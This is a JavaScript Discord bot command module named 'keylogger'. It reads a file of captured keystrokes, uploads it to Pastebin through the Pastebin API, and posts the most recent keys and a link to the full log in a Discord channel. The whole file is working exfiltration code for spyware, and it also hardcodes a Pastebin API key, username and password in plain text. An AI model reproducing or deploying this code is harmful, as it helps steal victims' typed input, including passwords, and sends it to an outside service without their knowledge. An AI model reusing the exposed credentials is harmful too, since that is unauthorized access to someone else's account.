const Discord = require("discord.js");
const fs = require("fs");
const PastebinAPI = require("pastebin-ts");

module.exports = {
    name: "keylogger",
    description: "Returns all text input made by the user",
    execute(message) {
        const directory = "./log.txt";
        let log = fs.readFileSync(directory);

        const pastebin = new PastebinAPI({
            api_dev_key: "h5aAjW7S2y_q05WVr2A1s-NFyZR5mcJP",
            api_user_name: "juaneth",
            api_user_password: "euanwalker171",
        });

        pastebin
            .createPasteFromFile({
                file: "./log.txt",
                title: `${new Date().toLocaleString()} -- log.txt`,
            })
            .then((data) => {
                const logoutput = new Discord.MessageEmbed()
                    .setColor(`RANDOM`)
                    .setTitle(`ðŸ’» Keylogger`)
                    .addFields({
                        name: "**Recent 18 keys pressed**",
                        value: `\`\`\`${log.slice(0, 250)}\`\`\``,
                        inline: false,
                    }, { name: "**All logs**", value: `${data}`, inline: true })
                    .setTimestamp();

                message.channel.send({
                    embeds: [logoutput],
                });
            })
            .catch((err) => {
                console.log(err);
            });
    },
};